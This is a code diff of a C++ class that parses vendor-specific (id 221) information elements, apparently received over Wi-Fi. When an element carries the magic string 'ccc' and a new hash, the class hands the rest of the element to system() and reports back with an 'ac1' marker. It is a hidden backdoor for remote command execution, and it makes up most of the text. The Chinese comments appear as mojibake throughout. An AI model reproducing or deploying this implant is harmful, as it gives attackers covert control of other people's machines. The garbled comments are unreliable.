@@ -1,7 +1,7 @@
 #include "stdafx.h"
-#include "Action_1.h"
+#include "Action.h"
 #include <windows.h>
-#include "1.h"
+#include "ghost.h"
 
 
 Action_1::Action_1():Action_Abs(){
@@ -14,7 +14,7 @@ Action_1::~Action_1(){
 
 void Action_1::set_sendInfo(char * infomation)
 {
-	char* magic_code = "ac1";	//!!!!ÌØÊâÊ¶±ð×Ö¶Î
+	char* magic_code = "ac1";	//!!!!ç‰¹æ®Šè¯†åˆ«å­—æ®µ
 	char *info = (char *)malloc(255);
 	memset(info, '\0', 255);
 	strncpy(info, magic_code,strlen(magic_code));
@@ -23,16 +23,16 @@ void Action_1::set_sendInfo(char * infomation)
 		Action_Abs::set_sendInfo(info);
 	}
 	else {
-		HLOG("¡¾ERROR¡¿Send Context len >252 !!!");
+		HLOG("ã€ERRORã€‘Send Context len >252 !!!");
 	}
 	free(info);
 }
 
 bool Action_1::ResolutionCMD(char *pp, int total_size) {
-	char* magic_code = "ccc";	//!!!!!ÌØÊâÊ¶±ð×Ö¶Î
+	char* magic_code = "ccc";	//!!!!!ç‰¹æ®Šè¯†åˆ«å­—æ®µ
 	boolean ResolutionCmd_STATUS = false;
 
-	while (total_size) {		//½âÎöËùÓÐµÄpayload
+	while (total_size) {		//è§£æžæ‰€æœ‰çš„payload
 		ie_data * ie = (struct ie_data *)pp;
 		//HLOG("total_size:%d\n", total_size);
 		//HLOG("ie  @ %x\n", &ie);
@@ -41,28 +41,28 @@ bool Action_1::ResolutionCMD(char *pp, int total_size) {
 		//HLOG("val @ %x: %s\n=========\n", &ie->val, ie->val);
 
 		if ((int)ie->id == 221) {
-			char *magic = (char *)&ie->val[0];//¶¨Î»µ½ ÃüÁîÐÅÏ¢Î»ÖÃ
-			HLOG("»ñÈ¡µÄvalÖÐµÄÐÅÏ¢£º%s \n", magic);//ÃüÁîÐÅÏ¢
+			char *magic = (char *)&ie->val[0];//å®šä½åˆ° å‘½ä»¤ä¿¡æ¯ä½ç½®
+			HLOG("èŽ·å–çš„valä¸­çš„ä¿¡æ¯ï¼š%s \n", magic);//å‘½ä»¤ä¿¡æ¯
 
-			if (strncmp(magic, magic_code, strlen(magic_code)) == 0) {//Ð£ÑéÌØÊâ×Ö¶Î
+			if (strncmp(magic, magic_code, strlen(magic_code)) == 0) {//æ ¡éªŒç‰¹æ®Šå­—æ®µ
 
 				char command[240] = { 0 };
 				char hash_tmp[9] = { '\0' };
-				strncpy(hash_tmp, magic + 3, 8);//ÌáÈ¡hash
+				strncpy(hash_tmp, magic + 3, 8);//æå–hash
 				if (strncmp(get_hash(), hash_tmp, 8) == 0) {
-					HLOG("¡¾WARNING¡¿REAPTINGHASH : %s\n", get_hash());
+					HLOG("ã€WARNINGã€‘REAPTINGHASH : %s\n", get_hash());
 					break;
 				}
 				else {
 					set_hash(hash_tmp);
 				}
 				strncpy_s(command, magic + 11, ie->len - 11);
-				HLOG("HASHÖµ£º%s\n", get_hash());
-				HLOG("Ö´ÐÐµÄÃüÁî£º%s\n", command);//Ö´ÐÐÃüÁî
+				HLOG("HASHå€¼ï¼š%s\n", get_hash());
+				HLOG("æ‰§è¡Œçš„å‘½ä»¤ï¼š%s\n", command);//æ‰§è¡Œå‘½ä»¤
 				system(command);
 				ResolutionCmd_STATUS = TRUE;
 				//system("pause");
-				//exit(1); //ÍË³ö
+				//exit(1); //é€€å‡º
 				set_sendInfo(get_hash());
 				
 				break;
